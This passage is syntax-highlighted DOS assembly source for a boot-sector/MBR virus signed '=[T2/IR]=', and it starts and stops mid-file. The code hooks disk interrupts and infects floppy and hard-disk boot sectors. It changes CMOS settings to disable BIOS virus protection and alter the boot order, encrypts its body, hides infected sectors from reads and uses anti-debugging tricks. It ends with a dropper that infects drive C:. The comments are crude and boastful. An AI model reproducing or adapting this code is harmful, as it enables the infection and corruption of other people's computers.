                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Read sector(s) ?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Params</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; Write sector(s) ?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Params</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">                 </span><span class="sc1">; Read long sector(s) ?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Params</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">                 </span><span class="sc1">; Write long sector(s) ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Int13h</span><span class="sc0">

</span><span class="sc5">Check_Params</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">                  </span><span class="sc1">; Head 0 ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Int13h</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; It's a bootsector/MBR ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Int13h</span><span class="sc0">

                </span><span class="sc1">; Can't have our own stealth-routine fuck things up.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Port_Stealth_Sw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Exit_Int76h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Port_Stealth_Sw</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Boot</span><span class="sc0">             </span><span class="sc1">; Infect/stealth.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Port_Stealth_Sw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Enable INT 76h stealth.</span><span class="sc0">

</span><span class="sc5">Exit_Int13h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

</span><span class="sc5">Return_Caller</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debug</span><span class="sc0">

                </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; Return to our caller.</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'666'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Infect_Boot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_For_Award</span><span class="sc0">         </span><span class="sc1">; Skip this routine when</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Check_Boot</span><span class="sc0">              </span><span class="sc1">; there ain't no Award-CMOS.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">                 </span><span class="sc1">; We want a byte from CMOS.</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; Delay for I/O.</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">                 </span><span class="sc1">; Read an Award status-byte.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">                 </span><span class="sc1">; Prepare CMOS to get our</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                 </span><span class="sc1">; manipulated byte.</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000001b</span><span class="sc0">           </span><span class="sc1">; Disable virus-protection.</span><span class="sc0">
                                                </span><span class="sc1">; Set boot-sequence C: A:.</span><span class="sc0">

                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                 </span><span class="sc1">; Put back manipulated byte.</span><span class="sc0">

</span><span class="sc1">; My original intention was to also set a random password in the BIOS-menu,</span><span class="sc0">
</span><span class="sc1">; so people could not change the boot-sequence to prevent the virus from</span><span class="sc0">
</span><span class="sc1">; becoming resident. However, my Award-CMOS seems to follow a different</span><span class="sc0">
</span><span class="sc1">; format than the one specified in many manuals, in fact, it almost seems</span><span class="sc0">
</span><span class="sc1">; as if my CMOS ain't modified at all by the password-settings! Weird...</span><span class="sc0">

</span><span class="sc5">Check_Boot</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">510</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0AA55h</span><span class="sc0">     </span><span class="sc1">; Make sure it's a valid</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Exit_Inf_B</span><span class="sc0">          </span><span class="sc1">; bootsector/MBR.</span><span class="sc0">

                </span><span class="sc1">; This disk is infected?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+(</span><span class="sc5">Signature</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0730h</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Do_Infect_Boot</span><span class="sc0">

                </span><span class="sc1">; Re-read original bootsector/MBR over the</span><span class="sc0">
                </span><span class="sc1">; infected one in the caller's buffer.</span><span class="sc0">

</span><span class="sc5">Try_Read_Boot</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+(</span><span class="sc5">Home_HD</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+(</span><span class="sc5">Home_TS</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Dispatcher</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Try_Read_Boot</span><span class="sc0">

</span><span class="sc5">JMP_Exit_Inf_B</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Inf_Boot</span><span class="sc0">

</span><span class="sc5">Do_Infect_Boot</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Give him a reset.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">JMP_Exit_Inf_B</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">; Copy the original boot</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">       </span><span class="sc1">; to our buffer.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Some lame anti-debugging.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Save the boot's DPB.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">STI</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                  </span><span class="sc1">; We're raping a FD or a HD ?</span><span class="sc0">
                </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">Calc_Home_FD</span><span class="sc0">

</span><span class="sc5">Calc_Home_HD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; Get drive-parameters.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000111111b</span><span class="sc0">   </span><span class="sc1">; We only need sector-count.</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; Last 2 sectors on track 0.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Store_Body</span><span class="sc0">

</span><span class="sc5">Calc_Home_FD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Total amount of sectors.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Ignore 32M+ disks.</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Exit_Inf_Boot</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Number of heads.</span><span class="sc0">

                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Sectors per track.</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Number of heads.</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc0">

</span><span class="sc5">Store_Body</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                  </span><span class="sc1">; Copy 2nd virus-sector to</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc1">; our buffer for encryption.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Set random key.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_Key_Body</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">

</span><span class="sc5">Encrypt_Body</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">512</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">            </span><span class="sc1">; Encrypt virusbody.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_Body</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0302h</span><span class="sc0">               </span><span class="sc1">; Store old boot + body.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Dispatcher</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Inf_Boot</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">Home_TS</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">Home_HD</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_Key_Loader</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Slide_Key_Ldr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">; Copy virus-loader to our</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                  </span><span class="sc1">; buffer for encryption.</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">End_Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus_Begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">End_Encrypted</span><span class="sc4">-</span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Encrypt_Byte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_Byte</span><span class="sc0">

                </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">Write_Inf_Boot</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">

</span><span class="sc5">Write_Inf_Boot</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Write infected boot.</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Dispatcher</span><span class="sc0">

</span><span class="sc5">Exit_Inf_Boot</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Author_Sign</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'=[T2/IR]='</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">



                </span><span class="sc1">; This is just a lame dropper which installs</span><span class="sc0">
                </span><span class="sc1">; the bootvirus in memory and infects drive C:</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Attempt_Alloc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2048</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Move_To_Alloc</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2048</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Attempt_Alloc</span><span class="sc0">

</span><span class="sc5">Move_To_Alloc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.MCB_PSP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Port_Stealth_Sw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3513h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Traced_Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
